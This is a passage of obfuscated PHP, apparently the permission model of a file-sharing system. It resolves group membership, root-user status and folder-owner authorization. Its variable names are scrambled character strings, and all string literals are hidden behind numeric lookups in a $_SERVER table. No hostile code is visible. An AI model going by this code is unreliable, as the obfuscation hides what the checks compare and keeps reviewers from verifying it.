array_multisort($—ÑÂ½ïô, SORT_ASC, $ñáşşä); return $ñáşşä; } private function groupChidldAllRootSource($½¤„Ê) { $É¬ìØ¾ =& $_SERVER[ì…™Î¶Ï]; $…®»¼¯ = Model($É¬ìØ¾[1975])->groupChildrenAll($½¤„Ê); $Èı®ÙÒë = array($É¬ìØ¾[489] => 0, $É¬ìØ¾[495] => array($É¬ìØ¾[7], $…®»¼¯), $É¬ìØ¾[403] => SourceModel::TYPE_GROUP); $´¯ì’Ûß = Model($É¬ìØ¾[800])->field($É¬ìØ¾[394])->where($Èı®ÙÒë)->select(); $´¯ì’Ûß = array_to_keyvalue($´¯ì’Ûß, $É¬ìØ¾[12], $É¬ìØ¾[394]); return $´¯ì’Ûß; } private function authTargetInfo($å´ÎİØº) { $¯²ÜëÛÁ =& $_SERVER[ì…™Î¶Ï]; $øöÈ–üğ = array(); $Î™•ìò† = array(); $±‰Ïßè· = 2 << 25; foreach ($å´ÎİØº as $©ÌĞ¬Ê©) { $¾àè¦îû = Model($¯²ÜëÛÁ[498])->listData($©ÌĞ¬Ê©[$¯²ÜëÛÁ[1900]]); if (!$¾àè¦îû) { continue; } if ($©ÌĞ¬Ê©[$¯²ÜëÛÁ[403]] == SourceModel::TYPE_USER) { $ˆ©ø‹áú = Model($¯²ÜëÛÁ[504])->getInfoSimpleOuter($©ÌĞ¬Ê©[$¯²ÜëÛÁ[495]]); if ($ˆ©ø‹áú[$¯²ÜëÛÁ[1631]] == $¯²ÜëÛÁ[1164]) { continue; } if ($ˆ©ø‹áú[$¯²ÜëÛÁ[1631]] == $¯²ÜëÛÁ[190]) { $ˆ©ø‹áú[$¯²ÜëÛÁ[32]] = LNG($¯²ÜëÛÁ[1976]); } } else { $ˆ©ø‹áú = Model($¯²ÜëÛÁ[513])->getInfoSimple($©ÌĞ¬Ê©[$¯²ÜëÛÁ[495]]); } if (!$ˆ©ø‹áú) { continue; } $ˆ©ø‹áú[$¯²ÜëÛÁ[457]] = $¾àè¦îû; $øöÈ–üğ[] = $ˆ©ø‹áú; $–ê§ûÑ  = 0; if ($©ÌĞ¬Ê©[$¯²ÜëÛÁ[403]] == SourceModel::TYPE_GROUP) { $–ê§ûÑ  = $±‰Ïßè· * 2; } if ($©ÌĞ¬Ê©[$¯²ÜëÛÁ[403]] == SourceModel::TYPE_USER) { $–ê§ûÑ  = $±‰Ïßè·; } if ($©ÌĞ¬Ê©[$¯²ÜëÛÁ[403]] == SourceModel::TYPE_USER && $©ÌĞ¬Ê©[$¯²ÜëÛÁ[495]] == $¯²ÜëÛÁ[190]) { $–ê§ûÑ  = 0; } $Î™•ìò†[] = $¾àè¦îû[$¯²ÜëÛÁ[405]] + $–ê§ûÑ ; } array_multisort($Î™•ìò†, SORT_DESC, $øöÈ–üğ); return $øöÈ–üğ; } public function getAllChildrenByUser($ùÈŸ«Øí, $ã»İÓÚ…) { $•¨ÂˆÜÊ =& $_SERVER[ì…™Î¶Ï]; $É¨ —©à = Model($•¨ÂˆÜÊ[529])->getInfo($ã»İÓÚ…); if (!$ã»İÓÚ… || !$ùÈŸ«Øí || !$É¨ —©à) { return array(); } $ƒİ°ıÎ† = Model($•¨ÂˆÜÊ[1301])->sourceInfo($ùÈŸ«Øí); $¨€ÚÜêø = array(); $µïÎ’è = 1; if ($ƒİ°ıÎ†[$•¨ÂˆÜÊ[489]] == $•¨ÂˆÜÊ[190] && $ƒİ°ıÎ†[$•¨ÂˆÜÊ[495]] != $µïÎ’è && $this->groupContainUser($ƒİ°ıÎ†[$•¨ÂˆÜÊ[495]], $ã»İÓÚ…)) { foreach ($É¨ —©à[$•¨ÂˆÜÊ[1977]] as $øÛ§çÄ¾) { $Èˆûò‚ = Model($•¨ÂˆÜÊ[513])->getInfo($øÛ§çÄ¾[$•¨ÂˆÜÊ[1799]]); $«¾æ‰—‰ = Model($•¨ÂˆÜÊ[529])->getInfoSimpleOuter($ã»İÓÚ…); $«¾æ‰—‰[$•¨ÂˆÜÊ[457]] = $øÛ§çÄ¾[$•¨ÂˆÜÊ[405]]; if (Model($•¨ÂˆÜÊ[498])->authCheckAction($øÛ§çÄ¾[$•¨ÂˆÜÊ[405]][$•¨ÂˆÜÊ[405]], $•¨ÂˆÜÊ[1819])) { continue; } $÷Êšç¤º = array($•¨ÂˆÜÊ[32] => $•¨ÂˆÜÊ[1580] . $Èˆûò‚[$•¨ÂˆÜÊ[32]], $•¨ÂˆÜÊ[394] => $Èˆûò‚[$•¨ÂˆÜÊ[87]][$•¨ÂˆÜÊ[394]], $•¨ÂˆÜÊ[78] => KodIO::make($Èˆûò‚[$•¨ÂˆÜÊ[87]][$•¨ÂˆÜÊ[394]]), $•¨ÂˆÜÊ[489] => $•¨ÂˆÜÊ[190], $•¨ÂˆÜÊ[403] => $•¨ÂˆÜÊ[506], $•¨ÂˆÜÊ[33] => $•¨ÂˆÜÊ[539], $•¨ÂˆÜÊ[510] => $Èˆûò‚[$•¨ÂˆÜÊ[517]], $•¨ÂˆÜÊ[1799] => $Èˆûò‚[$•¨ÂˆÜÊ[1799]], $•¨ÂˆÜÊ[514] => $Èˆûò‚[$•¨ÂˆÜÊ[489]], $•¨ÂˆÜÊ[1974] => array($«¾æ‰—‰)); $¨€ÚÜêø[$÷Êšç¤º[$•¨ÂˆÜÊ[394]]] = $÷Êšç¤º; } } $á‘Ù†‚å = array(); $ÆŸ… ¦Ü = $this->getAllChildren($ùÈŸ«Øí); foreach ($ÆŸ… ¦Ü as $–È·Ûü) { $¹ú«ïØÛ = !1; foreach ($–È·Ûü[$•¨ÂˆÜÊ[1974]] as $İİ‡ìÃê) { if ($İİ‡ìÃê[$•¨ÂˆÜÊ[1631]]) { if ($İİ‡ìÃê[$•¨ÂˆÜÊ[1631]] == $ã»İÓÚ…) { $¹ú«ïØÛ = !0; break; } } if ($İİ‡ìÃê[$•¨ÂˆÜÊ[1799]]) { if ($this->groupContainUser($İİ‡ìÃê[$•¨ÂˆÜÊ[1799]], $ã»İÓÚ…)) { $¹ú«ïØÛ = !0; break; } } } if ($¹ú«ïØÛ) { $á‘Ù†‚å[] = $–È·Ûü; } $–ÖÌŒì° = $–È·Ûü[$•¨ÂˆÜÊ[394]]; if (isset($¨€ÚÜêø[$–ÖÌŒì°])) { $–È·Ûü[$•¨ÂˆÜÊ[1974]][] = $¨€ÚÜêø[$–ÖÌŒì°][0]; $¨€ÚÜêø[$–ÖÌŒì°] = !1; } } $¨€ÚÜêø = array_filter(array_values($¨€ÚÜêø)); $á‘Ù†‚å = array_merge($¨€ÚÜêø, $á‘Ù†‚å); return $á‘Ù†‚å; } public function setAllChildrenByUser($Ö–’Ş•à, $¶Ò±§Ğë, $¸¢¢èîÑ) { $º€ùÕ™Œ =& $_SERVER[ì…™Î¶Ï]; $ûÜÅ€ÃŒ = $this->getAllChildrenByUser($Ö–’Ş•à, $¶Ò±§Ğë); if (!$¸¢¢èîÑ || !$ûÜÅ€ÃŒ) { return !1; } foreach ($ûÜÅ€ÃŒ as $¢ò•ß‹Î) { $¤Ãø”ĞÁ = array(); foreach ($¢ò•ß‹Î[$º€ùÕ™Œ[1974]] as $“èºÀ™ô) { $¤¼«è†¨ = $“èºÀ™ô[$º€ùÕ™Œ[457]]; $¿êœğ½ = $“èºÀ™ô[$º€ùÕ™Œ[1631]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $‘øÌæ = $“èºÀ™ô[$º€ùÕ™Œ[1631]] ? $“èºÀ™ô[$º€ùÕ™Œ[1631]] : $“èºÀ™ô[$º€ùÕ™Œ[1799]]; if ($“èºÀ™ô[$º€ùÕ™Œ[1631]] && $“èºÀ™ô[$º€ùÕ™Œ[1631]] == $¶Ò±§Ğë) { continue; } $¤Ãø”ĞÁ[] = array($º€ùÕ™Œ[394] => $¢ò•ß‹Î[$º€ùÕ™Œ[394]], $º€ùÕ™Œ[403] => $¿êœğ½, $º€ùÕ™Œ[495] => intval($‘øÌæ), $º€ùÕ™Œ[1900] => isset($¤¼«è†¨[$º€ùÕ™Œ[392]]) ? intval($¤¼«è†¨[$º€ùÕ™Œ[392]]) : 0, $º€ùÕ™Œ[1954] => isset($¤¼«è†¨[$º€ùÕ™Œ[1954]]) ? intval($¤¼«è†¨[$º€ùÕ™Œ[1954]]) : -1); } $¤Ãø”ĞÁ[] = array($º€ùÕ™Œ[394] => $¢ò•ß‹Î[$º€ùÕ™Œ[394]], $º€ùÕ™Œ[403] => SourceModel::TYPE_USER, $º€ùÕ™Œ[495] => intval($¶Ò±§Ğë), $º€ùÕ™Œ[1900] => intval($¸¢¢èîÑ), $º€ùÕ™Œ[1954] => -1); $this->where(array($º€ùÕ™Œ[409] => $¢ò•ß‹Î[$º€ùÕ™Œ[394]]))->delete(); $this->addAll($¤Ãø”ĞÁ); } return !0; } public function get($×ôğ¹ä) { $íÈš‹  = $this->getSourceList(array($×ôğ¹ä), !0); return $íÈš‹ [0]; } public function getSourceList($ğÏ¹íŒë, $ûë‚Ü§¤ = false, $İİ©ê˜î = false) { $òÆ…¼Ê =& $_SERVER[ì…™Î¶Ï]; if (!$ğÏ¹íŒë) { return array(); } $ÚÃÎ’ê = Model($òÆ…¼Ê[1301]); if (!$ûë‚Ü§¤ && count($ğÏ¹íŒë) == 1) { $ûë‚Ü§¤ = array(); $ûë‚Ü§¤[$ğÏ¹íŒë[0]] = $ÚÃÎ’ê->sourceInfo($ğÏ¹íŒë[0]); } if (!$ûë‚Ü§¤) { $¾ŸÈÃ¼ë = array($òÆ…¼Ê[409] => array($òÆ…¼Ê[410], $ğÏ¹íŒë)); $ûë‚Ü§¤ = $ÚÃÎ’ê->field($òÆ…¼Ê[1978])->where($¾ŸÈÃ¼ë)->select(); $ûë‚Ü§¤ = array_to_keyvalue($ûë‚Ü§¤, $òÆ…¼Ê[394]); } $´ÎÁª = $ğÏ¹íŒë; foreach ($ûë‚Ü§¤ as $¡†·§ë => $ËÅÒå©) { $Ñè©çİá = $ÚÃÎ’ê->parentLevelArray($ËÅÒå©[$òÆ…¼Ê[512]]); $´ÎÁª = array_merge($´ÎÁª, array($¡†·§ë), array_reverse($Ñè©çİá)); } $´ÎÁª = array_values(array_unique($´ÎÁª)); if (!$´ÎÁª) { return array(); } $‹Ì•‘ª  = $this->sourceAuthSelect($´ÎÁª); $îçÚÜœË = array(); foreach ($´ÎÁª as $ÍìÉ—ö×) { if (isset($‹Ì•‘ª [$ÍìÉ—ö×])) { $îçÚÜœË[$ÍìÉ—ö×] = $‹Ì•‘ª [$ÍìÉ—ö×]; } } $Ò„¸êûŠ = $this->userIsRoot($İİ©ê˜î); $©ùœ‹« = AuthModel::authAll(); $–ƒ²©Œã = array($òÆ…¼Ê[406] => $©ùœ‹«, $òÆ…¼Ê[1979] => array($òÆ…¼Ê[411] => 0, $òÆ…¼Ê[1805] => $©ùœ‹«, $òÆ…¼Ê[412] => LNG($òÆ…¼Ê[1980]), $òÆ…¼Ê[1821] => $òÆ…¼Ê[1981])); $«Ø©€ « = array(); foreach ($ûë‚Ü§¤ as $ÍìÉ—ö× => $Ñú˜¯Ÿ) { if ($Ò„¸êûŠ) { $«Ø©€ «[$ÍìÉ—ö×] = $–ƒ²©Œã; continue; } $«Ø©€ «[$ÍìÉ—ö×] = $this->makeSourceAuth($Ñú˜¯Ÿ, $îçÚÜœË, $İİ©ê˜î); } return $«Ø©€ «; } public function authDeepCheck($ªËÄÅÉ‰, $¾‹øíãÀ = false) { $Æ€­ƒÑË =& $_SERVER[ì…™Î¶Ï]; $¾‹øíãÀ = $¾‹øíãÀ ? $¾‹øíãÀ : USER_ID; $°Óâç·¾ = $this->makeAuthDeep($¾‹øíãÀ); if (!in_array($ªËÄÅÉ‰, $°Óâç·¾[$Æ€­ƒÑË[1982]])) { return !1; } $Àä¹ûÎ = array(); foreach ($°Óâç·¾[$Æ€­ƒÑË[1983]] as $ï›‡¬è => $ìŸÀÊ†‰) { if (!in_array($ªËÄÅÉ‰, $ìŸÀÊ†‰)) { continue; } $Àä¹ûÎ[] = $ï›‡¬è; } if (!$Àä¹ûÎ) { return !1; } $Üòéº—³ = $Àä¹ûÎ ? $Àä¹ûÎ[0] : $ªËÄÅÉ‰; return array($Æ€­ƒÑË[406] => -1, $Æ€­ƒÑË[457] => array($Æ€­ƒÑË[411] => $Æ€­ƒÑË[1164], $Æ€­ƒÑË[1805] => $Æ€­ƒÑË[190], $Æ€­ƒÑË[412] => LNG($Æ€­ƒÑË[1984]), $Æ€­ƒÑË[1821] => $Æ€­ƒÑË[1985]), $Æ€­ƒÑË[1986] => LNG($Æ€­ƒÑË[1987]), $Æ€­ƒÑË[1988] => $this->sourceAuthInfo($Üòéº—³)); } protected function makeAuthDeep($³ñÓ†æ = false) { $“–óòñí =& $_SERVER[ì…™Î¶Ï]; static $ÃÅÀ®ôÉ = array(); $³ñÓ†æ = $³ñÓ†æ ? $³ñÓ†æ : USER_ID; if (isset($ÃÅÀ®ôÉ[$³ñÓ†æ])) { return $ÃÅÀ®ôÉ[$³ñÓ†æ]; } $ÆÂ™Ğ„î = Model($“–óòñí[1989])->listData(); $şÍÌÆ™¤ = array(); foreach ($ÆÂ™Ğ„î as $šµáõå€) { if ($šµáõå€[$“–óòñí[405]] == 0 && $šµáõå€[$“–óòñí[1820]] == $“–óòñí[89]) { $şÍÌÆ™¤[] = $šµáõå€[$“–óòñí[392]]; } } $é µäè· = $this->userGroupParents($³ñÓ†æ); $ÆÓë©ˆœ = array($“–óòñí[403] => SourceModel::TYPE_USER, $“–óòñí[495] => $³ñÓ†æ); if ($é µäè·) { $ÆÓë©ˆœ = array(array($“–óòñí[403] => SourceModel::TYPE_USER, $“–óòñí[495] => $³ñÓ†æ), array($“–óòñí[403] => SourceModel::TYPE_GROUP, $“–óòñí[495] => array($“–óòñí[410], $é µäè·)), $“–óòñí[976] => $“–óòñí[1894]); } $É›­°© = $this->field($“–óòñí[1990])->where($ÆÓë©ˆœ)->select(); $¡À×ß¹² = array(); $ØÚ™ıë¯ = array_to_keyvalue_group($É›­°©, $“–óòñí[394]); foreach ($ØÚ™ıë¯ as $êµ«Ê²“ => $˜ÀœÚ·Ø) { $¶…¸ĞöŸ = $this->authArrayCheck($˜ÀœÚ·Ø, $³ñÓ†æ); if ($¶…¸ĞöŸ[$“–óòñí[406]] > 0) { $¡À×ß¹²[] = $êµ«Ê²“ . $“–óòñí[12]; } } if ($é µäè·) { $½—şïô¯ = Model($“–óòñí[513]); foreach ($é µäè· as $Ÿª›ÍÅÑ) { $â¿¸µ˜¾ = $½—şïô¯->getInfo($Ÿª›ÍÅÑ); if (!$â¿¸µ˜¾ || !is_array($â¿¸µ˜¾[$“–óòñí[87]])) { continue; } $¡À×ß¹²[] = $â¿¸µ˜¾[$“–óòñí[87]][$“–óòñí[394]]; } } $¿øĞ® = array(); $Üä„»÷¥ = $é µäè·; $ñ­í—ä = Model($“–óòñí[1301]); $½—şïô¯ = Model($“–óòñí[513]); $·…Èì» = array(); $–°Â‹ = array(); $«À€¾óÄ = array(); $˜éÚ€¨ = array(); if ($¡À×ß¹²) { $Œ¯şˆ¦ = $ñ­í—ä->where(array($“–óòñí[394] => array($“–óòñí[410], $¡À×ß¹²)))->select(); foreach ($Œ¯şˆ¦ as $Œàù‡âÚ) { $²¹¥Ÿ°Î = $ñ­í—ä->parentLevelArray($Œàù‡âÚ[$“–óòñí[512]]); $¿øĞ® = array_merge($¿øĞ®, $²¹¥Ÿ°Î); $Üä„»÷¥[] = $Œàù‡âÚ[$“–óòñí[495]]; $·…Èì»[$Œàù‡âÚ[$“–óòñí[394]]] = $²¹¥Ÿ°Î; $–°Â‹[$Œàù‡âÚ[$“–óòñí[394]]] = $Œàù‡âÚ[$“–óòñí[495]]; } } $Üä„»÷¥ = array_values(array_unique($Üä„»÷¥)); $±®¯€³ã = $Üä„»÷¥; foreach ($±®¯€³ã as $Ÿª›ÍÅÑ) { $â¿¸µ˜¾ = $½—şïô¯->getInfo($Ÿª›ÍÅÑ); $²¹¥Ÿ°Î = $ñ­í—ä->parentLevelArray($â¿¸µ˜¾[$“–óòñí[512]]); $Üä„»÷¥ = array_merge($Üä„»÷¥, $²¹¥Ÿ°Î); } $Üä„»÷¥ = array_values(array_unique($Üä„»÷¥)); foreach ($Üä„»÷¥ as $Ÿª›ÍÅÑ) { $â¿¸µ˜¾ = $½—şïô¯->getInfo($Ÿª›ÍÅÑ); $¿øĞ®[] = $â¿¸µ˜¾[$“–óòñí[87]][$“–óòñí[394]]; $«À€¾óÄ[$Ÿª›ÍÅÑ] = $â¿¸µ˜¾[$“–óòñí[87]][$“–óòñí[394]]; $˜éÚ€¨[$Ÿª›ÍÅÑ] = $ñ­í—ä->parentLevelArray($â¿¸µ˜¾[$“–óòñí[512]]); } foreach ($·…Èì» as $şğµÖ‹ => $Ôş½ïƒ¸) { $­¢•„Š„ = $–°Â‹[$şğµÖ‹]; if (!$­¢•„Š„ || !$«À€¾óÄ[$­¢•„Š„]) { continue; } $ŠìÖ÷º = array(); foreach ($˜éÚ€¨[$­¢•„Š„] as $Ÿª›ÍÅÑ) { $ŠìÖ÷º[] = $«À€¾óÄ[$Ÿª›ÍÅÑ]; } $·…Èì»[$şğµÖ‹] = array_merge($ŠìÖ÷º, $Ôş½ïƒ¸); } $¿øĞ® = array_values(array_unique($¿øĞ®)); $‰¤—¥¢£ = array($“–óòñí[1982] => $¿øĞ®, $“–óòñí[1983] => $·…Èì»); $ÃÅÀ®ôÉ[$³ñÓ†æ] = $‰¤—¥¢£; return $‰¤—¥¢£; } private function makeSourceAuth($Á–´µ™, $æÒç¾Ü¥, $„òáÂæš = false) { $Ÿ¬£Éà =& $_SERVER[ì…™Î¶Ï]; $ëœ±²ã = $Ÿ¬£Éà[89]; $ÆÜøâ×÷ = $Á–´µ™[$Ÿ¬£Éà[495]]; $©÷ßÏ´Ş = $Á–´µ™[$Ÿ¬£Éà[403]] == SourceModel::TYPE_GROUP; $ÎáìîƒÊ = $©÷ßÏ´Ş ? $this->groupRootAuth($ÆÜøâ×÷, $„òáÂæš) : !1; if ($ÎáìîƒÊ && Model($Ÿ¬£Éà[498])->authCheckAction($ÎáìîƒÊ[$Ÿ¬£Éà[405]], $Ÿ¬£Éà[1819])) { return $this->groupAuthInfo($ÎáìîƒÊ, $ÆÜøâ×÷); } $×ğ²¸õÒ = Model($Ÿ¬£Éà[1301])->parentLevelArray($Á–´µ™[$Ÿ¬£Éà[512]]); $×ğ²¸õÒ = array_merge(array($Á–´µ™[$Ÿ¬£Éà[394]]), array_reverse($×ğ²¸õÒ)); $ÀÈÊ‹î = !1; foreach ($×ğ²¸õÒ as $ê„˜è„ ) { if (!isset($æÒç¾Ü¥[$ê„˜è„ ])) { continue; } $¨şäšö = $this->authMake($æÒç¾Ü¥[$ê„˜è„ ], $„òáÂæš); if ($¨şäšö[$Ÿ¬£Éà[457]]) { $ÀÈÊ‹î = $¨şäšö; break; } } if (!$©÷ßÏ´Ş) { return $ÀÈÊ‹î; } if (!$ÀÈÊ‹î && $ÎáìîƒÊ) { $ÀÈÊ‹î = $this->groupAuthInfo($ÎáìîƒÊ, $ÆÜøâ×÷); } if (!$ÀÈÊ‹î) { $ø¾˜Ò• = Model($Ÿ¬£Éà[513])->getInfo($ÆÜøâ×÷); $ÀÛÀŞ¤ = explode($Ÿ¬£Éà[50], trim($ø¾˜Ò•[$Ÿ¬£Éà[512]], $Ÿ¬£Éà[50])); $ÀÛÀŞ¤ = array_reverse($ÀÛÀŞ¤); foreach ($ÀÛÀŞ¤ as $˜Â•­Ê) { if ($˜Â•­Ê == $Ÿ¬£Éà[190] || $˜Â•­Ê == $ëœ±²ã) { continue; } $¼ò¶ŒŠâ = $this->groupRootAuth($˜Â•­Ê, $„òáÂæš); if (!$¼ò¶ŒŠâ) { continue; } $ÀÈÊ‹î = $this->groupAuthInfo($¼ò¶ŒŠâ, $˜Â•­Ê); break; } } if (!$ÀÈÊ‹î || $ÀÈÊ‹î[$Ÿ¬£Éà[406]] <= 0) { $ÈÆ†÷Ã = $this->authDeepCheck($Á–´µ™[$Ÿ¬£Éà[394]], $„òáÂæš); if ($ÈÆ†÷Ã) { $ÀÈÊ‹î = $ÈÆ†÷Ã; } } return $ÀÈÊ‹î; } private function userIsRoot($·şâóÑƒ = false) { $‘Ÿƒ½´Ò =& $_SERVER[ì…™Î¶Ï]; if (!$·şâóÑƒ && _get($GLOBALS, $‘Ÿƒ½´Ò[496])) { return !0; } $©ë§™Æ = Model($‘Ÿƒ½´Ò[529])->getInfo($·şâóÑƒ); $Ç¯ãÍªˆ = Model($‘Ÿƒ½´Ò[1991])->listData($©ë§™Æ[$‘Ÿƒ½´Ò[1511]]); if ($Ç¯ãÍªˆ && $Ç¯ãÍªˆ[$‘Ÿƒ½´Ò[502]][$‘Ÿƒ½´Ò[1992]] == 1) { return !0; } return !1; } private function sourceAuthInfo($¬‚¨‘ß¶) { $Öú¸æøš =& $_SERVER[ì…™Î¶Ï]; $Ù•×¬ò = Model($Öú¸æøš[1301]); $şªà…Ê‰ = $Ù•×¬ò->sourceInfo($¬‚¨‘ß¶); if (!$şªà…Ê‰) { return !1; } $Ù•×¬ò->groupPathDisplay($şªà…Ê‰); $ÎŸ¨òİä = array($şªà…Ê‰); $ÎŸ¨òİä = $Ù•×¬ò->_listAppendPath($ÎŸ¨òİä); $şªà…Ê‰ = $ÎŸ¨òİä[0]; $‚ï¥¢Ã… = $şªà…Ê‰[$Öú¸æøš[510]]; if (isset($şªà…Ê‰[$Öú¸æøš[518]])) { $ƒ°—’ì = explode($Öú¸æøš[8], trim($şªà…Ê‰[$Öú¸æøš[510]], $Öú¸æøš[8])); array_shift($ƒ°—’ì); $‚ï¥¢Ã… = $şªà…Ê‰[$Öú¸æøš[516]] . $Öú¸æøš[1993] . implode($Öú¸æøš[8], $ƒ°—’ì); } return array($Öú¸æøš[412] => $şªà…Ê‰[$Öú¸æøš[32]], $Öú¸æøš[78] => KodIO::make($şªà…Ê‰[$Öú¸æøš[394]]), $Öú¸æøš[1994] => $‚ï¥¢Ã…); } private function groupAuthInfo($óÂœÑ¹Ô, $¡¼èÒ) { $ÆŠ–«õ¨ =& $_SERVER[ì…™Î¶Ï]; $¬°×¾¿Ë = Model($ÆŠ–«õ¨[513])->getInfo($¡¼èÒ); return array($ÆŠ–«õ¨[1995] => intval($óÂœÑ¹Ô[$ÆŠ–«õ¨[405]]), $ÆŠ–«õ¨[1979] => $óÂœÑ¹Ô, $ÆŠ–«õ¨[1996] => LNG($ÆŠ–«õ¨[1997]), $ÆŠ–«õ¨[1988] => array($ÆŠ–«õ¨[412] => $¬°×¾¿Ë[$ÆŠ–«õ¨[32]], $ÆŠ–«õ¨[78] => KodIO::make($¬°×¾¿Ë[$ÆŠ–«õ¨[87]][$ÆŠ–«õ¨[394]]), $ÆŠ–«õ¨[1994] => $¬°×¾¿Ë[$ÆŠ–«õ¨[517]])); } protected function groupRootAuth($¯ìÀ½ÖÑ, $Ñ˜«ææ = false) { $È’°ã†ğ =& $_SERVER[ì…™Î¶Ï]; $Ñ˜«ææ = $Ñ˜«ææ ? $Ñ˜«ææ : USER_ID; $ÉÆ¼µú« = $Ñ˜«ææ . $È’°ã†ğ[1998] . $¯ìÀ½ÖÑ; static $§úİÅğÖ = array(); if (isset($§úİÅğÖ[$ÉÆ¼µú«])) { return $§úİÅğÖ[$ÉÆ¼µú«]; } $–‰‚¨ˆ¼ = Model($È’°ã†ğ[513])->getInfo($¯ìÀ½ÖÑ); $ïøÃÕ‰İ = $this->userGroupList($Ñ˜«ææ); $åŸœ® Ä = isset($ïøÃÕ‰İ[$¯ìÀ½ÖÑ]) ? $ïøÃÕ‰İ[$¯ìÀ½ÖÑ][$È’°ã†ğ[405]] : !1; if ($åŸœ® Ä && Model($È’°ã†ğ[498])->authCheckAction($åŸœ® Ä[$È’°ã†ğ[405]], $È’°ã†ğ[1819])) { $§úİÅğÖ[$ÉÆ¼µú«] = $åŸœ® Ä; return $åŸœ® Ä; } $Äº©¯— = $this->sourceAuthSelect($–‰‚¨ˆ¼[$È’°ã†ğ[87]][$È’°ã†ğ[394]]); $ÏÑ—ç˜ = $Äº©¯— ? $this->authMake($Äº©¯—, $Ñ˜«ææ) : !1; $Şíèªü¤ = $ÏÑ—ç˜ ? $ÏÑ—ç˜[$È’°ã†ğ[457]] : !1; $§úİÅğÖ[$ÉÆ¼µú«] = $Şíèªü¤ ? $Şíèªü¤ : $åŸœ® Ä; return $§úİÅğÖ[$ÉÆ¼µú«]; } public function authOwnerApply($’ıò¬ÀÉ) { $ãÖ­“ô‚ =& $_SERVER[ì…™Î¶Ï]; if (empty($’ıò¬ÀÉ[$ãÖ­“ô‚[405]]) || isset($’ıò¬ÀÉ[$ãÖ­“ô‚[1999]]) && $’ıò¬ÀÉ[$ãÖ­“ô‚[1999]]) { return $’ıò¬ÀÉ; } if (AuthModel::authCheckRoot($’ıò¬ÀÉ[$ãÖ­“ô‚[405]][$ãÖ­“ô‚[406]])) { return $’ıò¬ÀÉ; } $ºğ½úÄû = Model($ãÖ­“ô‚[1301])->parentLevelArray($’ıò¬ÀÉ[$ãÖ­“ô‚[512]]); $ºğ½úÄû = array_merge(array($’ıò¬ÀÉ[$ãÖ­“ô‚[394]]), array_reverse($ºğ½úÄû)); $ÜĞ±½ € = $this->sourceAuthSelect($ºğ½úÄû); $æ¯ñ”ˆÒ = array(); $·ËøÏï† = array(); foreach ($ÜĞ±½ € as $™ä’ç™½ => $œ÷¦¿‚ä) { $Ù–“‚–€ = $this->authFolderOwnerUser($œ÷¦¿‚ä); $æ¯ñ”ˆÒ[$™ä’ç™½] = $Ù–“‚–€; $·ËøÏï† = array_merge($·ËøÏï†, $Ù–“‚–€[$ãÖ­“ô‚[585]]); if ($Ù–“‚–€[$ãÖ­“ô‚[2000]]) { break; } } if (count($·ËøÏï†) == 0) { $·ËøÏï† = $this->authFolderOwnerGroup($’ıò¬ÀÉ[$ãÖ­“ô‚[495]]); } $·ËøÏï† = array_unique($·ËøÏï†); if (AuthModel::authCheckRoot($’ıò¬ÀÉ[$ãÖ­“ô‚[405]][$ãÖ­“ô‚[406]])) { $·ËøÏï†[] = USER_ID; } $’ıò¬ÀÉ[$ãÖ­“ô‚[405]][$ãÖ­“ô‚[2001]] = Model($ãÖ­“ô‚[504])->userListInfo($·ËøÏï†); return $’ıò¬ÀÉ; } private function authFolderOwnerGroup($‡¦¼œùĞ) { $Òóñ’Öñ =& $_SERVER[ì…™Î¶Ï]; $¤–í « = Model($Òóñ’Öñ[1888])->where(array($Òóñ’Öñ[1799] => $‡¦¼œùĞ))->select(); $ƒŸÛ“±Û = array(); if (!$¤–í «) { return $ƒŸÛ“±Û; } foreach ($¤–í « as $©µ¸Ó“) { $ò–¬‰ƒ² = $this->authInfo($©µ¸Ó“); if (AuthModel::authCheckRoot($ò–¬‰ƒ²[$Òóñ’Öñ[405]])) { $ƒŸÛ“±Û[] = $©µ¸Ó“[$Òóñ’Öñ[1631]]; } } return $ƒŸÛ“±Û; } private function authFolderOwnerUser($í¯Âü¹°) { $ Œº¶´Ë =& $_SERVER[ì…™Î¶Ï]; $ß÷Å°ğä = array(); $ä…“†ïº = !1; foreach ($í¯Âü¹° as $ºÎ¡ ½Ã) { $â¨Âë¼” = $this->authInfo($ºÎ¡ ½Ã); if ($ºÎ¡ ½Ã[$ Œº¶´Ë[495]] == $ Œº¶´Ë[190]) { $ä…“†ïº = !0; } if ($ºÎ¡ ½Ã[$ Œº¶´Ë[403]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($â¨Âë¼”[$ Œº¶´Ë[405]])) { $ß÷Å°ğä[] = $ºÎ¡ ½Ã[$ Œº¶´Ë[495]]; } } } return array($ Œº¶´Ë[585] => $ß÷Å°ğä, $ Œº¶´Ë[2000] => $ä…“†ïº); } public function authMake($‚¹¾Ã¥, $¦º²§³¶ = false) { $ì¯¸ø‡˜ =& $_SERVER[ì…™Î¶Ï]; $™Úªü = $this->authArrayCheck($‚¹¾Ã¥, $¦º²§³¶); if ($™Úªü[$ì¯¸ø‡˜[2002]]) { $™Úªü[$ì¯¸ø‡˜[2002]] = $this->sourceAuthInfo($™Úªü[$ì¯¸ø‡˜[2002]]); } return $™Úªü; } public function authArrayCheck($ŞÁ­æš, $¶½½íğã = false) { $›ôîÄÊ‹ =& $_SERVER[ì…™Î¶Ï]; if (!$ŞÁ­æš) { return array($›ôîÄÊ‹[406] => 0, $›ôîÄÊ‹[457] => !1); } $¶½½íğã = $¶½½íğã ? $¶½½íğã : USER_ID; $Í…ÎË¯ê = 0; $Á‰«Ìò¢ = 0; $á§¯¢°¤ = 0; $´ÍÙíÁá = 0; $£‡’Áşó = 0; $ı‰§˜Ö¢ = 0; $‚õ÷ÏøŸ = 1000; $›´œ§±‹ = 0; $¬ØôË” = 0; $š˜çÍ‹Ä = 0; $ƒ¢ÆÌò = 0; $¡¶ëúİÒ = array($›ôîÄÊ‹[394] => 0); foreach ($ŞÁ­æš as $¡¶ëúİÒ) { $‚ÈÊı€Í = $this->authInfo($¡¶ëúİÒ); if (!$‚ÈÊı€Í) { continue; } $¥»¹«‡é = $¡¶ëúİÒ[$›ôîÄÊ‹[495]]; $ä³â¬—» = intval($‚ÈÊı€Í[$›ôîÄÊ‹[405]]); if ($¡¶ëúİÒ[$›ôîÄÊ‹[403]] == SourceModel::TYPE_USER && $¥»¹«‡é == $¶½½íğã) { $Í…ÎË¯ê = !0; $á§¯¢°¤ = $‚ÈÊı€Í; $Á‰«Ìò¢ = $ä³â¬—»; } else { if ($¡¶ëúİÒ[$›ôîÄÊ‹[403]] == SourceModel::TYPE_GROUP && 